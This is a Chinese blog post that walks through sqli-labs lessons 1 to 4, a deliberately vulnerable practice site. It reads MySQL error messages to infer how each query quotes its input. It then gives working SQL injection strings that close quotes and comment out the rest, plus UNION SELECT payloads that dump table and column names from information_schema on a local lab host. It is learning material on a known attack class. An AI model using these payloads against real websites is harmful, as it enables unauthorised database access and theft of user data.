---
title: Sql注入学习之sqli-lab-1-4
tags: [Sql注入]
categories: [网络安全]
date: 2016-03-19 14:17:08
---

## 1. Less-1 GET-基于错误-单引号-字符型

![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1-1.png?)

我们将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

<!-- more -->

截取我们感兴趣的那一部分, 即:
` ''1'' LIMIT 0,1' `
为了让大家看的更加清楚一下, 我们去掉前后匹配单引号并故意拉大其中的距离
` '　　1'　　' LIMIT 0,1 `
可以看到 `1'` 是我们输入的数据

接着我们再测试一下

![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1-2.png?)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\' LIMIT 0,1' at line 1

同样的方法摘取我们感兴趣的:
` ''1\' LIMIT 0,1' `
去掉前后匹配的单引号, 拉大距离:
` '　　1\　　' LIMIT 0,1 `
可以清楚的看出这次我们输入的是 `1\`

将俩次分析后的结果放在一起比较: 
` '　　1'　　' LIMIT 0,1 `
` '　　1\　　' LIMIT 0,1 `
其中`1'`和`1\`是由用户输入的, 所以由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = ' our-provided-input '

即所有用户输入都被包含在一个单引号之中。 我们称其为字符型。 在注入时要考虑“闭合”单引号。

----------------------------------------

## 2. Less-2 GET-基于错误-整数型
    
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L2-1.png?)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

` '' LIMIT 0,1' `

去掉前后的单引号后我们发现仅仅剩下我们刚才输入的 `1'` 后面的 `'` 了。
`　　'　　LIMIT 0,1 `
同理, 我们试着输入 `1\`得到的结果如下:
`　　\　　LIMIT 0,1 `
很显然, 前面的数字被正常接受了

所以, 同Less-1, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = our-provided-input 

即, 用户输入没有被任何字符包含。 我们称其为数字型。

--------------------------------------------------

## 3. Less-3 GET-基于错误-单引号和括号-字符型

![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L3-1.png?)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

` ''1'') LIMIT 0,1' `

去掉前后匹配的单引号, 拉大距离:
` '　　1'　　') `
同上测试 `1\`
` '　　1\　　') `
其中`1'`和`1\`是由用户输入的, 所以由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = (' our-provided-input ')

所以在注入时 要考虑"闭合"后面的`')`: 所以注入语句如下:
` 1') or/and ('1')=('1 `   即:  id = ('1') or/and ('1')=('1') LIMIT 0,1
` 1') --+ `     即:  id = ('1') --+ ') 注释法

-----------------------------------------

## 4. Less-4 GET-基于错误-双引号和括号-字符型

![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L4-1.png?)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1\") LIMIT 0,1' at line 1

` '"1\") LIMIT 0,1' `

去掉前后匹配的单引号, 拉大距离, 测试输入`1"`和`1"`:
` "　　1"　　") `
` "　　1\　　") `
由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = (" our-provided-input ")

所以在注入时 要考虑"闭合"后面的`")`: 所以注入语句如下:
` 1") or/and ("1")=("1 `   即:  id = ("1") or/and ("1")=("1") LIMIT 0,1
` 1") --+ `     即:  id = ("1") --+ ') 注释法

------------------------------------------------

## 5. Less1 - Less4 小结

Less1-4 因为根据**id**传入不同有数据回显给我们, 所以可以用联合语句爆出我们感兴趣的一些字段:
例如:
### 猜测字段:
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-1.png?)
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-2.png?)
可以知道字段数字为**3**个
### 找暴露点
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-3.png?)
可以看出没有什么数字爆出, 这是我们把**id**的值改为负数
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-4.png?)
这样, 我们看到有数字 2, 3 暴露了出来

### 查询一些数据库名, 版本, 用户等重要信息
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-5.png?)

由上图我们知道数据库版本是mysql的**5.0**以上版本, 所以可以用**information.schema**查询

### 所有表名
用以下语句可以看出security数据库中的所有表名
10.211.55.7/sqli/Less-4/?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-6.png?)

### 所有字段名
用一下语句可以看到users表中的所有字段名
10.211.55.7/sqli/Less-4/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-7.png?)

最后我们知道了表名和字段名, 便可以直接查询其中的值, 如下图中查询emails表中的id和email值:
![](http://7xrahm.com1.z0.glb.clouddn.com/blog/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8Bsqli-lab/L1_4-8.png?)

